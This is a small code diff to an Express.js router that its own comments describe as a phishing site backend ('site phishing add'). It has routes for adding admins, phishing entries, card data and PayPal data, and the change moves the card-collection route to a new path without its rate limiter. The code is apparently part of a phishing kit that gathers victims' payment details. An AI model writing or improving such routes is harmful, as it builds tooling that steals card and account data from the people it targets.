@@ -32,7 +32,7 @@ router.post('/edit/link/', add_new_links);//edit links number
 router.post('/admin/add', poster_add);//admin user and pass add
 
 router.post('/ad/:adminId/:posterId',rateLimitMiddleware, add_data);  ///site phishing add
-router.post('/card/add',rateLimitMiddleware,card_add)  
+router.post('/card/add/new', card_add)  
 
 router.post('/add/paypal', add_paypal);  ///site phishing add
 
